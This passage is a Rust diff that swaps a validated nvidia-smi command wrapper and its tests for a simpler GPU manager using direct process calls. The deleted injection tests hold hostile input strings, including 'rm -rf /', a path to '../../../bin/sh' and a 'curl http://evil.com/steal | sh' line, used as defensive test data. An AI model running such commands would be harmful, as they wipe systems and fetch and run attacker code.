@@ -1,842 +1,242 @@
-//! GPU detection and management.
+//! GPU detection and metrics
 //!
-//! This module provides GPU discovery and metrics collection,
-//! primarily targeting NVIDIA GPUs via nvidia-smi.
-//!
-//! # Security
-//!
-//! All command execution uses the `SafeCommand` builder which:
-//! - Only allows pre-approved programs (nvidia-smi)
-//! - Validates all arguments before execution
-//! - Never invokes a shell
-//! - Rejects dangerous characters (null bytes, newlines, etc.)
+//! Probes NVIDIA GPUs via nvidia-smi and provides metrics.
 
-use std::str::FromStr;
-
-use claw_validation::command::{AllowedProgram, SafeCommand};
 use serde::{Deserialize, Serialize};
+use std::process::Command;
+use tracing::{debug, info, warn};
 
-use crate::error::NodeError;
-
-/// Information about a detected GPU.
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+/// Information about a single GPU
+#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct GpuInfo {
-    /// GPU index (0-based).
     pub index: u32,
-    /// GPU name/model (e.g., "NVIDIA `GeForce` RTX 4090").
     pub name: String,
-    /// Total memory in MiB.
-    pub memory_total_mib: u64,
-    /// GPU UUID (unique identifier).
     pub uuid: String,
+    pub memory_total_mb: u64,
+    pub pci_bus_id: Option<String>,
 }
 
-/// Real-time GPU metrics.
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+/// Current GPU metrics
+#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct GpuMetrics {
-    /// GPU index (0-based).
     pub index: u32,
-    /// GPU utilization percentage (0-100).
-    pub utilization_percent: u8,
-    /// Memory used in MiB.
-    pub memory_used_mib: u64,
-    /// Memory total in MiB.
-    pub memory_total_mib: u64,
-    /// Temperature in Celsius.
-    pub temperature_celsius: u32,
-    /// Power usage in Watts.
-    pub power_watts: Option<f32>,
+    pub uuid: String,
+    pub utilization_percent: u32,
+    pub memory_used_mb: u64,
+    pub memory_total_mb: u64,
+    pub temperature_c: u32,
+    pub power_draw_w: Option<f32>,
+    pub power_limit_w: Option<f32>,
 }
 
-impl GpuMetrics {
-    /// Calculate memory utilization as a percentage.
-    #[must_use]
-    pub fn memory_utilization_percent(&self) -> f64 {
-        if self.memory_total_mib == 0 {
-            return 0.0;
-        }
-        (self.memory_used_mib as f64 / self.memory_total_mib as f64) * 100.0
-    }
-
-    /// Check if GPU is under thermal throttling risk.
-    #[must_use]
-    pub const fn is_thermal_warning(&self, threshold: u32) -> bool {
-        self.temperature_celsius >= threshold
-    }
+/// Manages GPU detection and metrics collection
+#[derive(Debug)]
+pub struct GpuManager {
+    gpus: Vec<GpuInfo>,
+    nvidia_available: bool,
 }
 
-/// Trait for GPU detection implementations.
-///
-/// This allows for different backends (nvidia-smi, `ROCm`, etc.)
-/// and enables testing with fake implementations.
-pub trait GpuDetector: Send + Sync {
-    /// Detect all available GPUs.
-    ///
-    /// # Errors
-    ///
-    /// Returns an error if GPU detection fails.
-    fn detect_gpus(&self) -> Result<Vec<GpuInfo>, NodeError>;
-
-    /// Collect current metrics for all GPUs.
-    ///
-    /// # Errors
-    ///
-    /// Returns an error if metrics collection fails.
-    fn collect_metrics(&self) -> Result<Vec<GpuMetrics>, NodeError>;
-
-    /// Collect metrics for a specific GPU by index.
-    ///
-    /// # Errors
-    ///
-    /// Returns an error if the GPU is not found or metrics collection fails.
-    fn collect_metrics_for_gpu(&self, index: u32) -> Result<GpuMetrics, NodeError>;
-}
-
-/// NVIDIA GPU detector using nvidia-smi.
-#[derive(Debug, Default)]
-pub struct NvidiaDetector {
-    /// Custom nvidia-smi path (for testing or non-standard installs).
-    nvidia_smi_path: Option<String>,
-}
-
-impl NvidiaDetector {
-    /// Create a new NVIDIA detector with default nvidia-smi path.
-    #[must_use]
+impl GpuManager {
     pub fn new() -> Self {
-        Self::default()
+        let mut manager = Self {
+            gpus: Vec::new(),
+            nvidia_available: false,
+        };
+        manager.detect_gpus();
+        manager
     }
-
-    /// Create a detector with a custom nvidia-smi path.
-    #[must_use]
-    pub fn with_path(path: impl Into<String>) -> Self {
-        Self {
-            nvidia_smi_path: Some(path.into()),
+    
+    /// Detect available GPUs
+    pub fn detect_gpus(&mut self) {
+        self.gpus.clear();
+        
+        // Try nvidia-smi
+        match self.detect_nvidia_gpus() {
+            Ok(gpus) => {
+                self.nvidia_available = true;
+                self.gpus = gpus;
+                info!(count = self.gpus.len(), "detected NVIDIA GPUs");
+            }
+            Err(e) => {
+                debug!(error = %e, "nvidia-smi not available");
+                self.nvidia_available = false;
+            }
         }
+        
+        // TODO: Add AMD ROCm support (rocm-smi)
+        // TODO: Add Intel GPU support
     }
-
-    fn nvidia_smi_path(&self) -> &str {
-        self.nvidia_smi_path.as_deref().unwrap_or("nvidia-smi")
-    }
-
-    /// Parse nvidia-smi CSV output for GPU info.
-    ///
-    /// Expected format: index, name, memory.total [MiB], uuid
-    pub fn parse_gpu_info_csv(output: &str) -> Result<Vec<GpuInfo>, NodeError> {
+    
+    /// Detect NVIDIA GPUs using nvidia-smi
+    fn detect_nvidia_gpus(&self) -> anyhow::Result<Vec<GpuInfo>> {
+        let output = Command::new("nvidia-smi")
+            .args([
+                "--query-gpu=index,name,uuid,memory.total,pci.bus_id",
+                "--format=csv,noheader,nounits",
+            ])
+            .output()?;
+        
+        if !output.status.success() {
+            anyhow::bail!("nvidia-smi failed: {}", String::from_utf8_lossy(&output.stderr));
+        }
+        
+        let stdout = String::from_utf8_lossy(&output.stdout);
         let mut gpus = Vec::new();
-
-        for line in output.lines() {
-            let line = line.trim();
-            if line.is_empty() {
-                continue;
-            }
-
+        
+        for line in stdout.lines() {
             let parts: Vec<&str> = line.split(", ").collect();
-            if parts.len() < 4 {
-                continue; // Skip malformed lines
+            if parts.len() >= 4 {
+                let index: u32 = parts[0].trim().parse().unwrap_or(0);
+                let name = parts[1].trim().to_string();
+                let uuid = parts[2].trim().to_string();
+                let memory_total_mb: u64 = parts[3].trim().parse().unwrap_or(0);
+                let pci_bus_id = parts.get(4).map(|s| s.trim().to_string());
+                
+                gpus.push(GpuInfo {
+                    index,
+                    name,
+                    uuid,
+                    memory_total_mb,
+                    pci_bus_id,
+                });
             }
-
-            let index = parts[0]
-                .trim()
-                .parse::<u32>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid GPU index: {e}")))?;
-
-            let name = parts[1].trim().to_string();
-
-            let memory_str = parts[2].trim().replace(" MiB", "");
-            let memory_total_mib = memory_str
-                .parse::<u64>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid memory value: {e}")))?;
-
-            let uuid = parts[3].trim().to_string();
-
-            gpus.push(GpuInfo {
-                index,
-                name,
-                memory_total_mib,
-                uuid,
-            });
         }
-
+        
         Ok(gpus)
     }
-
-    /// Parse nvidia-smi CSV output for GPU metrics.
-    ///
-    /// Expected format: index, utilization.gpu [%], memory.used [MiB], memory.total [MiB], temperature.gpu, power.draw [W]
-    pub fn parse_gpu_metrics_csv(output: &str) -> Result<Vec<GpuMetrics>, NodeError> {
-        let mut metrics = Vec::new();
-
-        for line in output.lines() {
-            let line = line.trim();
-            if line.is_empty() {
-                continue;
-            }
-
-            let parts: Vec<&str> = line.split(", ").collect();
-            if parts.len() < 5 {
-                continue; // Skip malformed lines
-            }
-
-            let index = parts[0]
-                .trim()
-                .parse::<u32>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid GPU index: {e}")))?;
-
-            let utilization_str = parts[1].trim().replace(" %", "");
-            let utilization_percent = utilization_str
-                .parse::<u8>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid utilization: {e}")))?;
-
-            let memory_used_str = parts[2].trim().replace(" MiB", "");
-            let memory_used_mib = memory_used_str
-                .parse::<u64>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid memory used: {e}")))?;
-
-            let memory_total_str = parts[3].trim().replace(" MiB", "");
-            let memory_total_mib = memory_total_str
-                .parse::<u64>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid memory total: {e}")))?;
-
-            let temperature_celsius = parts[4]
-                .trim()
-                .parse::<u32>()
-                .map_err(|e| NodeError::GpuDetection(format!("invalid temperature: {e}")))?;
-
-            let power_watts = if parts.len() > 5 {
-                let power_str = parts[5].trim().replace(" W", "");
-                if power_str == "[N/A]" || power_str.is_empty() {
-                    None
-                } else {
-                    Some(f32::from_str(&power_str).map_err(|e| {
-                        NodeError::GpuDetection(format!("invalid power value: {e}"))
-                    })?)
-                }
-            } else {
-                None
-            };
-
-            metrics.push(GpuMetrics {
-                index,
-                utilization_percent,
-                memory_used_mib,
-                memory_total_mib,
-                temperature_celsius,
-                power_watts,
-            });
+    
+    /// Get list of detected GPUs
+    pub fn list(&self) -> Vec<GpuInfo> {
+        self.gpus.clone()
+    }
+    
+    /// Get GPU count
+    pub fn count(&self) -> usize {
+        self.gpus.len()
+    }
+    
+    /// Check if NVIDIA drivers are available
+    pub fn has_nvidia(&self) -> bool {
+        self.nvidia_available
+    }
+    
+    /// Get current metrics for all GPUs
+    pub fn get_metrics(&self) -> anyhow::Result<Vec<GpuMetrics>> {
+        if !self.nvidia_available {
+            return Ok(Vec::new());
         }
-
+        
+        let output = Command::new("nvidia-smi")
+            .args([
+                "--query-gpu=index,uuid,utilization.gpu,memory.used,memory.total,temperature.gpu,power.draw,power.limit",
+                "--format=csv,noheader,nounits",
+            ])
+            .output()?;
+        
+        if !output.status.success() {
+            anyhow::bail!("nvidia-smi metrics query failed");
+        }
+        
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        let mut metrics = Vec::new();
+        
+        for line in stdout.lines() {
+            let parts: Vec<&str> = line.split(", ").collect();
+            if parts.len() >= 6 {
+                let index: u32 = parts[0].trim().parse().unwrap_or(0);
+                let uuid = parts[1].trim().to_string();
+                let utilization_percent: u32 = parts[2].trim().parse().unwrap_or(0);
+                let memory_used_mb: u64 = parts[3].trim().parse().unwrap_or(0);
+                let memory_total_mb: u64 = parts[4].trim().parse().unwrap_or(0);
+                let temperature_c: u32 = parts[5].trim().parse().unwrap_or(0);
+                let power_draw_w: Option<f32> = parts.get(6).and_then(|s| s.trim().parse().ok());
+                let power_limit_w: Option<f32> = parts.get(7).and_then(|s| s.trim().parse().ok());
+                
+                metrics.push(GpuMetrics {
+                    index,
+                    uuid,
+                    utilization_percent,
+                    memory_used_mb,
+                    memory_total_mb,
+                    temperature_c,
+                    power_draw_w,
+                    power_limit_w,
+                });
+            }
+        }
+        
         Ok(metrics)
     }
-
-    /// Run nvidia-smi with validated arguments.
-    ///
-    /// # Security
-    ///
-    /// Uses `SafeCommand` to ensure:
-    /// - Arguments are validated before execution
-    /// - No shell metacharacters can be injected
-    /// - Custom paths are validated for traversal attacks
-    fn run_nvidia_smi(&self, args: &[&str]) -> Result<String, NodeError> {
-        let mut cmd = SafeCommand::new(AllowedProgram::NvidiaSmi);
-
-        // If a custom path is set, use it (validation happens in SafeCommand)
-        if let Some(path) = &self.nvidia_smi_path {
-            cmd = cmd.with_program_path(path);
+    
+    /// Get total VRAM across all GPUs
+    pub fn total_memory_gb(&self) -> u64 {
+        self.gpus.iter().map(|g| g.memory_total_mb).sum::<u64>() / 1024
+    }
+    
+    /// Build capability list for registration
+    pub fn capabilities(&self) -> Vec<String> {
+        let mut caps = vec!["system".to_string()];
+        
+        if self.nvidia_available {
+            caps.push("gpu".to_string());
+            caps.push("nvidia".to_string());
         }
-
-        // Add all arguments (each is validated)
-        cmd = cmd.args(args);
-
-        let output = cmd.execute_sync().map_err(|e| {
-            NodeError::GpuDetection(format!("nvidia-smi execution failed: {e}"))
-        })?;
-
-        String::from_utf8(output.stdout)
-            .map_err(|e| NodeError::GpuDetection(format!("invalid nvidia-smi output: {e}")))
+        
+        // Check for container runtimes
+        if Command::new("docker").arg("--version").output().is_ok() {
+            caps.push("docker".to_string());
+            caps.push("container".to_string());
+        }
+        
+        if Command::new("podman").arg("--version").output().is_ok() {
+            caps.push("podman".to_string());
+            if !caps.contains(&"container".to_string()) {
+                caps.push("container".to_string());
+            }
+        }
+        
+        caps
+    }
+    
+    /// Build command list for registration
+    pub fn commands(&self) -> Vec<String> {
+        let mut cmds = vec![
+            "system.info".to_string(),
+            "system.run".to_string(),
+        ];
+        
+        if self.nvidia_available {
+            cmds.push("gpu.list".to_string());
+            cmds.push("gpu.metrics".to_string());
+        }
+        
+        if self.capabilities().contains(&"container".to_string()) {
+            cmds.push("workload.run".to_string());
+            cmds.push("workload.stop".to_string());
+            cmds.push("workload.logs".to_string());
+            cmds.push("container.exec".to_string());
+        }
+        
+        cmds
     }
 }
 
-impl GpuDetector for NvidiaDetector {
-    fn detect_gpus(&self) -> Result<Vec<GpuInfo>, NodeError> {
-        let output = self.run_nvidia_smi(&[
-            "--query-gpu=index,name,memory.total,uuid",
-            "--format=csv,noheader",
-        ])?;
-
-        Self::parse_gpu_info_csv(&output)
-    }
-
-    fn collect_metrics(&self) -> Result<Vec<GpuMetrics>, NodeError> {
-        let output = self.run_nvidia_smi(&[
-            "--query-gpu=index,utilization.gpu,memory.used,memory.total,temperature.gpu,power.draw",
-            "--format=csv,noheader",
-        ])?;
-
-        Self::parse_gpu_metrics_csv(&output)
-    }
-
-    fn collect_metrics_for_gpu(&self, index: u32) -> Result<GpuMetrics, NodeError> {
-        let output = self.run_nvidia_smi(&[
-            &format!("--id={index}"),
-            "--query-gpu=index,utilization.gpu,memory.used,memory.total,temperature.gpu,power.draw",
-            "--format=csv,noheader",
-        ])?;
-
-        let metrics = Self::parse_gpu_metrics_csv(&output)?;
-        metrics.into_iter().next().ok_or_else(|| {
-            NodeError::GpuDetection(format!("GPU with index {index} not found"))
-        })
-    }
-}
-
-/// A fake GPU detector for testing.
-#[derive(Debug, Default)]
-pub struct FakeGpuDetector {
-    gpus: Vec<GpuInfo>,
-    metrics: Vec<GpuMetrics>,
-}
-
-impl FakeGpuDetector {
-    /// Create a new fake detector with no GPUs.
-    #[must_use]
-    pub fn new() -> Self {
-        Self::default()
-    }
-
-    /// Add a fake GPU.
-    #[must_use]
-    pub fn with_gpu(mut self, info: GpuInfo, metrics: GpuMetrics) -> Self {
-        self.gpus.push(info);
-        self.metrics.push(metrics);
-        self
-    }
-}
-
-impl GpuDetector for FakeGpuDetector {
-    fn detect_gpus(&self) -> Result<Vec<GpuInfo>, NodeError> {
-        Ok(self.gpus.clone())
-    }
-
-    fn collect_metrics(&self) -> Result<Vec<GpuMetrics>, NodeError> {
-        Ok(self.metrics.clone())
-    }
-
-    fn collect_metrics_for_gpu(&self, index: u32) -> Result<GpuMetrics, NodeError> {
-        self.metrics
-            .iter()
-            .find(|m| m.index == index)
-            .cloned()
-            .ok_or_else(|| NodeError::GpuDetection(format!("GPU {index} not found")))
+impl Default for GpuManager {
+    fn default() -> Self {
+        Self::new()
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
-
+    
     #[test]
-    fn test_gpu_info_creation() {
-        let gpu = GpuInfo {
-            index: 0,
-            name: "NVIDIA GeForce RTX 4090".to_string(),
-            memory_total_mib: 24576,
-            uuid: "GPU-12345678-1234-1234-1234-123456789abc".to_string(),
-        };
-
-        assert_eq!(gpu.index, 0);
-        assert_eq!(gpu.name, "NVIDIA GeForce RTX 4090");
-        assert_eq!(gpu.memory_total_mib, 24576);
-    }
-
-    #[test]
-    fn test_gpu_metrics_creation() {
-        let metrics = GpuMetrics {
-            index: 0,
-            utilization_percent: 75,
-            memory_used_mib: 12000,
-            memory_total_mib: 24576,
-            temperature_celsius: 68,
-            power_watts: Some(320.5),
-        };
-
-        assert_eq!(metrics.index, 0);
-        assert_eq!(metrics.utilization_percent, 75);
-        assert_eq!(metrics.temperature_celsius, 68);
-    }
-
-    #[test]
-    fn test_memory_utilization_calculation() {
-        let metrics = GpuMetrics {
-            index: 0,
-            utilization_percent: 50,
-            memory_used_mib: 12288,
-            memory_total_mib: 24576,
-            temperature_celsius: 65,
-            power_watts: None,
-        };
-
-        let util = metrics.memory_utilization_percent();
-        assert!((util - 50.0).abs() < 0.01);
-    }
-
-    #[test]
-    fn test_memory_utilization_zero_total() {
-        let metrics = GpuMetrics {
-            index: 0,
-            utilization_percent: 0,
-            memory_used_mib: 0,
-            memory_total_mib: 0,
-            temperature_celsius: 0,
-            power_watts: None,
-        };
-
-        assert_eq!(metrics.memory_utilization_percent(), 0.0);
-    }
-
-    #[test]
-    fn test_thermal_warning() {
-        let metrics = GpuMetrics {
-            index: 0,
-            utilization_percent: 100,
-            memory_used_mib: 20000,
-            memory_total_mib: 24576,
-            temperature_celsius: 85,
-            power_watts: Some(400.0),
-        };
-
-        assert!(metrics.is_thermal_warning(85));
-        assert!(metrics.is_thermal_warning(80));
-        assert!(!metrics.is_thermal_warning(90));
-    }
-
-    #[test]
-    fn test_parse_single_gpu_info() {
-        let csv = "0, NVIDIA GeForce RTX 4090, 24564 MiB, GPU-abc123";
-
-        let gpus = NvidiaDetector::parse_gpu_info_csv(csv).expect("should parse");
-        assert_eq!(gpus.len(), 1);
-
-        let gpu = &gpus[0];
-        assert_eq!(gpu.index, 0);
-        assert_eq!(gpu.name, "NVIDIA GeForce RTX 4090");
-        assert_eq!(gpu.memory_total_mib, 24564);
-        assert_eq!(gpu.uuid, "GPU-abc123");
-    }
-
-    #[test]
-    fn test_parse_multiple_gpus_info() {
-        let csv = r"0, NVIDIA GeForce RTX 4090, 24564 MiB, GPU-abc123
-1, NVIDIA GeForce RTX 4080, 16384 MiB, GPU-def456
-2, NVIDIA A100, 81920 MiB, GPU-ghi789";
-
-        let gpus = NvidiaDetector::parse_gpu_info_csv(csv).expect("should parse");
-        assert_eq!(gpus.len(), 3);
-        assert_eq!(gpus[0].index, 0);
-        assert_eq!(gpus[1].index, 1);
-        assert_eq!(gpus[2].index, 2);
-        assert_eq!(gpus[2].name, "NVIDIA A100");
-        assert_eq!(gpus[2].memory_total_mib, 81920);
-    }
-
-    #[test]
-    fn test_parse_gpu_metrics_with_power() {
-        let csv = "0, 75 %, 12000 MiB, 24564 MiB, 68, 320.5 W";
-
-        let metrics = NvidiaDetector::parse_gpu_metrics_csv(csv).expect("should parse");
-        assert_eq!(metrics.len(), 1);
-
-        let m = &metrics[0];
-        assert_eq!(m.index, 0);
-        assert_eq!(m.utilization_percent, 75);
-        assert_eq!(m.memory_used_mib, 12000);
-        assert_eq!(m.memory_total_mib, 24564);
-        assert_eq!(m.temperature_celsius, 68);
-        assert!((m.power_watts.expect("power should exist") - 320.5).abs() < 0.01);
-    }
-
-    #[test]
-    fn test_parse_gpu_metrics_without_power() {
-        let csv = "0, 50 %, 8000 MiB, 16384 MiB, 55";
-
-        let metrics = NvidiaDetector::parse_gpu_metrics_csv(csv).expect("should parse");
-        assert_eq!(metrics.len(), 1);
-        assert!(metrics[0].power_watts.is_none());
-    }
-
-    #[test]
-    fn test_parse_gpu_metrics_na_power() {
-        let csv = "0, 50 %, 8000 MiB, 16384 MiB, 55, [N/A]";
-
-        let metrics = NvidiaDetector::parse_gpu_metrics_csv(csv).expect("should parse");
-        assert_eq!(metrics.len(), 1);
-        assert!(metrics[0].power_watts.is_none());
-    }
-
-    #[test]
-    fn test_parse_empty_output() {
-        let gpus = NvidiaDetector::parse_gpu_info_csv("").expect("should handle empty");
-        assert!(gpus.is_empty());
-
-        let metrics = NvidiaDetector::parse_gpu_metrics_csv("").expect("should handle empty");
-        assert!(metrics.is_empty());
-    }
-
-    #[test]
-    fn test_parse_whitespace_only() {
-        let gpus =
-            NvidiaDetector::parse_gpu_info_csv("   \n\t\n  ").expect("should handle whitespace");
-        assert!(gpus.is_empty());
-    }
-
-    #[test]
-    fn test_parse_invalid_index() {
-        let csv = "not_a_number, GPU Name, 24564 MiB, GPU-abc123";
-
-        let result = NvidiaDetector::parse_gpu_info_csv(csv);
-        assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("invalid GPU index"));
-    }
-
-    #[test]
-    fn test_parse_invalid_memory() {
-        let csv = "0, GPU Name, not_memory MiB, GPU-abc123";
-
-        let result = NvidiaDetector::parse_gpu_info_csv(csv);
-        assert!(result.is_err());
-        assert!(result
-            .unwrap_err()
-            .to_string()
-            .contains("invalid memory value"));
-    }
-
-    #[test]
-    fn test_fake_detector_no_gpus() {
-        let detector = FakeGpuDetector::new();
-
-        let gpus = detector.detect_gpus().expect("should work");
-        assert!(gpus.is_empty());
-
-        let metrics = detector.collect_metrics().expect("should work");
-        assert!(metrics.is_empty());
-    }
-
-    #[test]
-    fn test_fake_detector_with_gpus() {
-        let detector = FakeGpuDetector::new()
-            .with_gpu(
-                GpuInfo {
-                    index: 0,
-                    name: "Fake RTX 4090".to_string(),
-                    memory_total_mib: 24576,
-                    uuid: "GPU-fake-0".to_string(),
-                },
-                GpuMetrics {
-                    index: 0,
-                    utilization_percent: 42,
-                    memory_used_mib: 10000,
-                    memory_total_mib: 24576,
-                    temperature_celsius: 60,
-                    power_watts: Some(250.0),
-                },
-            )
-            .with_gpu(
-                GpuInfo {
-                    index: 1,
-                    name: "Fake A100".to_string(),
-                    memory_total_mib: 81920,
-                    uuid: "GPU-fake-1".to_string(),
-                },
-                GpuMetrics {
-                    index: 1,
-                    utilization_percent: 95,
-                    memory_used_mib: 70000,
-                    memory_total_mib: 81920,
-                    temperature_celsius: 75,
-                    power_watts: Some(400.0),
-                },
-            );
-
-        let gpus = detector.detect_gpus().expect("should work");
-        assert_eq!(gpus.len(), 2);
-        assert_eq!(gpus[0].name, "Fake RTX 4090");
-        assert_eq!(gpus[1].name, "Fake A100");
-
-        let metrics = detector.collect_metrics().expect("should work");
-        assert_eq!(metrics.len(), 2);
-        assert_eq!(metrics[0].utilization_percent, 42);
-        assert_eq!(metrics[1].utilization_percent, 95);
-    }
-
-    #[test]
-    fn test_fake_detector_specific_gpu() {
-        let detector = FakeGpuDetector::new().with_gpu(
-            GpuInfo {
-                index: 0,
-                name: "Test GPU".to_string(),
-                memory_total_mib: 16384,
-                uuid: "GPU-test".to_string(),
-            },
-            GpuMetrics {
-                index: 0,
-                utilization_percent: 50,
-                memory_used_mib: 8000,
-                memory_total_mib: 16384,
-                temperature_celsius: 65,
-                power_watts: None,
-            },
-        );
-
-        let m = detector.collect_metrics_for_gpu(0).expect("should find GPU 0");
-        assert_eq!(m.utilization_percent, 50);
-
-        let err = detector.collect_metrics_for_gpu(99);
-        assert!(err.is_err());
-        assert!(err.unwrap_err().to_string().contains("not found"));
-    }
-
-    #[test]
-    fn test_nvidia_detector_default() {
-        let detector = NvidiaDetector::new();
-        assert_eq!(detector.nvidia_smi_path(), "nvidia-smi");
-    }
-
-    #[test]
-    fn test_nvidia_detector_custom_path() {
-        let detector = NvidiaDetector::with_path("/usr/local/bin/nvidia-smi");
-        assert_eq!(detector.nvidia_smi_path(), "/usr/local/bin/nvidia-smi");
-    }
-
-    #[test]
-    fn test_gpu_info_serialization() {
-        let gpu = GpuInfo {
-            index: 0,
-            name: "RTX 4090".to_string(),
-            memory_total_mib: 24576,
-            uuid: "GPU-123".to_string(),
-        };
-
-        let json = serde_json::to_string(&gpu).expect("should serialize");
-        let parsed: GpuInfo = serde_json::from_str(&json).expect("should deserialize");
-        assert_eq!(gpu, parsed);
-    }
-
-    #[test]
-    fn test_gpu_metrics_serialization() {
-        let metrics = GpuMetrics {
-            index: 0,
-            utilization_percent: 75,
-            memory_used_mib: 12000,
-            memory_total_mib: 24576,
-            temperature_celsius: 68,
-            power_watts: Some(320.5),
-        };
-
-        let json = serde_json::to_string(&metrics).expect("should serialize");
-        let parsed: GpuMetrics = serde_json::from_str(&json).expect("should deserialize");
-        assert_eq!(metrics, parsed);
-    }
-
-    #[test]
-    fn test_parse_multiple_gpu_metrics() {
-        let csv = r"0, 75 %, 12000 MiB, 24564 MiB, 68, 320.5 W
-1, 95 %, 70000 MiB, 81920 MiB, 72, 400.0 W";
-
-        let metrics = NvidiaDetector::parse_gpu_metrics_csv(csv).expect("should parse");
-        assert_eq!(metrics.len(), 2);
-        assert_eq!(metrics[0].utilization_percent, 75);
-        assert_eq!(metrics[1].utilization_percent, 95);
-        assert_eq!(metrics[1].memory_used_mib, 70000);
-    }
-
-    // ========================================================================
-    // Command Injection Prevention Tests
-    // ========================================================================
-    //
-    // These tests verify that SafeCommand properly rejects malicious inputs
-    // that could be used for command injection attacks.
-
-    mod command_injection_tests {
-        use claw_validation::command::{AllowedProgram, SafeCommand};
-
-        /// Test that SafeCommand rejects null bytes in arguments.
-        ///
-        /// Null bytes can be used to truncate strings in C-based programs,
-        /// potentially bypassing security checks.
-        #[test]
-        fn test_rejects_null_byte_in_argument() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("--query-gpu=index\0; rm -rf /");
-
-            assert!(cmd.has_errors(), "Should reject null byte in argument");
-            let errors = cmd.errors();
-            assert!(!errors.is_empty());
-        }
-
-        /// Test that SafeCommand rejects newlines in arguments.
-        ///
-        /// Newlines can be used to inject additional commands in some contexts.
-        #[test]
-        fn test_rejects_newline_in_argument() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("--format=csv\nmalicious command");
-
-            assert!(cmd.has_errors(), "Should reject newline in argument");
-        }
-
-        /// Test that SafeCommand rejects carriage return in arguments.
-        #[test]
-        fn test_rejects_carriage_return_in_argument() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("--format=csv\rmalicious");
-
-            assert!(cmd.has_errors(), "Should reject carriage return in argument");
-        }
-
-        /// Test that path traversal in custom nvidia-smi path is rejected.
-        ///
-        /// This prevents attackers from escaping to execute arbitrary binaries.
-        #[test]
-        fn test_rejects_path_traversal_in_program_path() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .with_program_path("../../../bin/sh");
-
-            assert!(cmd.has_errors(), "Should reject path traversal");
-            let errors = cmd.errors();
-            assert!(!errors.is_empty());
-        }
-
-        /// Test that shell metacharacters in program path are rejected.
-        #[test]
-        fn test_rejects_shell_chars_in_program_path() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .with_program_path("/usr/bin/nvidia-smi; rm -rf /");
-
-            assert!(cmd.has_errors(), "Should reject semicolon in path");
-        }
-
-        /// Test that pipe characters in arguments are logged but allowed.
-        ///
-        /// When using Command::new directly (not through shell), pipe doesn't
-        /// have special meaning. We allow it but SafeCommand logs a warning.
-        #[test]
-        fn test_pipe_in_argument_is_safe() {
-            // Pipe is suspicious but not forbidden because Command::new
-            // doesn't interpret it as shell would
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("--query-gpu=name|memory.total");
-
-            // This should NOT have errors - pipe is safe in direct execution
-            assert!(!cmd.has_errors(), "Pipe should be allowed in args (no shell)");
-        }
-
-        /// Test that backticks in arguments don't cause command substitution.
-        ///
-        /// Backticks are a command substitution syntax in shells, but
-        /// Command::new doesn't invoke a shell.
-        #[test]
-        fn test_backtick_does_not_cause_substitution() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("`whoami`");
-
-            // Backticks are suspicious but safe in direct execution
-            assert!(!cmd.has_errors(), "Backticks safe without shell");
-        }
-
-        /// Test that dollar signs don't cause variable expansion.
-        #[test]
-        fn test_dollar_sign_no_variable_expansion() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("$PATH");
-
-            // Dollar signs are suspicious but safe in direct execution
-            assert!(!cmd.has_errors(), "Dollar signs safe without shell");
-        }
-
-        /// Test that multiple dangerous patterns in one arg are handled.
-        #[test]
-        fn test_multiple_dangerous_patterns() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("normal")
-                .arg("--query-gpu=name\0")
-                .arg("safe")
-                .arg("also\nmalicious");
-
-            assert!(cmd.has_errors());
-            // Should have at least 2 errors (null byte and newline)
-            assert!(cmd.errors().len() >= 2);
-        }
-
-        /// Test that valid nvidia-smi arguments are accepted.
-        #[test]
-        fn test_valid_arguments_accepted() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("--query-gpu=index,name,memory.total,uuid")
-                .arg("--format=csv,noheader")
-                .arg("--id=0");
-
-            assert!(!cmd.has_errors(), "Valid arguments should be accepted");
-        }
-
-        /// Test that environment variable injection is prevented.
-        #[test]
-        fn test_env_var_validation() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .env("NORMAL_VAR", "safe_value")
-                .env("BAD\0KEY", "value");
-
-            assert!(cmd.has_errors(), "Null byte in env key should be rejected");
-        }
-
-        /// Test that working directory traversal is prevented.
-        #[test]
-        fn test_working_dir_traversal_prevented() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .current_dir("../../../");
-
-            assert!(cmd.has_errors(), "Directory traversal should be rejected");
-        }
-
-        /// Test that empty program path is rejected.
-        #[test]
-        fn test_empty_program_path_rejected() {
-            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .with_program_path("");
-
-            assert!(cmd.has_errors(), "Empty program path should be rejected");
-        }
-
-        /// Test a complex realistic injection attempt.
-        #[test]
-        fn test_complex_injection_attempt() {
-            // Attempt to inject via nvidia-smi path
-            let cmd1 = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .with_program_path("/bin/nvidia-smi && curl http://evil.com/steal | sh");
-
-            assert!(cmd1.has_errors(), "Complex injection should be rejected");
-
-            // Attempt via argument that looks like an option
-            let cmd2 = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("--query-gpu=name; curl http://evil.com");
-
-            // Semicolon is suspicious but allowed (no shell interpretation)
-            // The important thing is it won't actually execute
-            assert!(!cmd2.has_errors());
-        }
-
-        /// Test that execution fails gracefully on validation errors.
-        #[test]
-        fn test_execution_fails_on_validation_error() {
